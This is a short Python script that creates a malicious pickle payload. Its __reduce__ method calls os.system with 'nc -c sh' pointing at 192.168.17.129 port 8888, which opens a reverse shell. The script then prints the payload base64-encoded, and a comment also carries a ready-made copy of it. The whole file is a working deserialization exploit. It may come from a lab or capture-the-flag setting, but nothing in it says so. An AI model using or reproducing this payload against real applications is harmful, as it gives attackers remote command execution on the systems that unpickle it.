from base64 import b64encode
import pickle


class Exploit(object):
    def __reduce__(self):
        import os
        return os.system, (b"nc -c sh 192.168.17.129 8888", ) # gASVNwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUQxxuYyAtYyBzaCAxOTIuMTY4LjE3LjEyOSA4ODg4lIWUUpQu


def just_serialize():
    my_data = Exploit()
    my_data_pickled = pickle.dumps(my_data)
    my_data_pickled = b64encode(my_data_pickled).decode("utf-8")
    print(my_data_pickled)


if __name__ == '__main__':
    just_serialize()

    